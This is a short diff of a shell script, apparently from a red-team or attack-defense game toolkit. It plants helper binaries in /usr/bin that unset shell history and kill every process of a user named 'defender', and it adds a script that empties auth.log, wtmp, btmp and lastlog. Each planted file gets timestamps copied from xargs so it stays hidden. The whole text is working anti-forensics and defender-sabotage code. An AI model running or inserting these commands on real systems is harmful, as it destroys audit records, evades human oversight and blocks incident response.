@@ -45,3 +45,12 @@ md5sum /usr/bin/false
 
 echo "unset HISTFILE" > /usr/bin/ww && chmod +x /usr/bin/ww && touch -r /usr/bin/ww /usr/bin/xargs
 echo "pkill -u defender" > /usr/bin/mm && chmod +x /usr/bin/mm && touch -r /usr/bin/mm /usr/bin/xargs
+
+cat << 'EOF' > /usr/bin/logre
+#!/usr/bin/env bash
+> /var/log/auth.log
+> /var/log/wtmp
+> /var/log/btmp
+> /var/log/lastlog
+EOF
+chmod +x /usr/bin/logre && touch -r /usr/bin/logre /usr/bin/xargs
